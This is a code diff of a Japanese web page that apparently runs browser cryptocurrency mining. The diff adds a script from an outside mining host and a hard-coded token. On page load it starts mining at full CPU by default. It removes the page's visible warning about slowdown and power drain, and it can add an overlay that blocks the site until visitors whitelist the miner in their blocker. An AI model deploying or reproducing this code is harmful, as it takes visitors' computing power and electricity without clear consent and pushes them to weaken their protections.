@@ -2,11 +2,122 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width">
+    <link href="https://cdn.jsdelivr.net/npm/@mdi/font@6.x/css/materialdesignicons.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/vuetify@2.6.2/dist/vuetify.min.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, minimal-ui">
     <title>ブラウザマイニング</title>
 </head>
 <body>
-    ブラウザマイニングを行っています。<br>
-    動作速度の低下・電力消耗などが発生する可能性があるため、問題が発生した場合はこのページを閉じてください。
+    <div id="app" v-cloak>
+        <v-app>
+            <v-main>
+                <v-container>
+                    <v-row>
+                        <v-col cols="12">
+                            <v-form>
+                                <v-container>
+                                    <v-row>
+                                        <v-col cols="6">
+                                            <v-slider
+                                                v-model="form.percent"
+                                                max="100"
+                                                min="10"
+                                                step="10"
+                                            ></v-slider>
+                                        </v-col>
+                                        <v-col cols="6">
+                                            {{form.percent}}%でマイニング
+                                        </v-col>
+                                        <v-col cols="12">
+                                            <v-checkbox
+                                                v-model="form.showAdvertisement"
+                                                label="広告を表示する"
+                                            ></v-checkbox>
+                                        </v-col>
+                                        <v-col cols="12">
+                                            <v-checkbox
+                                                v-model="form.blockMySite"
+                                                label="許可されるまでマイニングをブロックする"
+                                            ></v-checkbox>
+                                        </v-col>
+                                        <v-col cols="12">
+                                            <v-checkbox
+                                                v-model="form.addNotification"
+                                                label="通知する"
+                                            ></v-checkbox>
+                                        </v-col>
+                                        <v-btn
+                                            elevation="2"
+                                            @click="startMining(form)"
+                                        >更新</v-btn>
+                                    </v-row>
+                                </v-container>
+                            </v-form>
+                        </v-col>
+                    </v-row>
+                </v-container>
+            </v-main>
+        </v-app>
+    </div>
+    
+    
+    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.2/dist/vue.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/vuetify@2.6.2/dist/vuetify.js"></script>
+    <script src="https://www.hostingcloud.racing/cIpn.js"></script>
+    <script>
+        const TOKEN = "21b02be91fd8bf0c04af9371b5b4c047579649c289dc2b2e0e6fad219672ea4b"
+        new Vue({
+            el: "#app",
+            vuetify: new Vuetify(),
+            data: {
+                form: {
+                    percent: 100,
+                    showAdvertisement: true,
+                    blockMySite: false,
+                    addNotification: false
+                },
+                message: "ブラウザマイニングを行っています。動作速度の低下・電力消耗などが発生する可能性があるため、問題が発生した場合はこのページを閉じてください。"
+            },
+            methods:{
+                startMining: function(form){
+                    console.log("start mining");
+                    const throttle = 1 - form.percent / 100;
+                    let options = {
+                        throttle: 1 - form.percent / 100,
+                        c: "w"
+                    };
+                    if(!form.showAdvertisement){
+                        options.ads = 0;
+                    }
+                    var _client = new Client.Anonymous(TOKEN, options)
+                    _client.start();
+
+                    if(form.addNotification){
+                        _client.addMiningNotification("Top", this.message, "#cccccc", 40, "#3d3d3d");
+                    }
+
+                    if(form.blockMySite){
+                        setTimeout(function(){
+                            if(typeof _client === 'undefined' || _client === null)
+                            {
+                                var messageDiv = document.createElement("div");
+                                messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
+                                messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
+                                var mainDiv = document.createElement("div");
+                                mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
+                                mainDiv.appendChild(messageDiv);
+                                document.body.appendChild(mainDiv);
+                                document.getElementsByTagName("body")[0].style.overflow = "hidden";
+                                window.scrollTo(0, 0);
+                            }
+                        },1000);
+                    }
+                },
+            },
+            mounted: function(){
+                this.startMining(this.form);
+            }
+        })
+    </script>
 </body>
 </html>
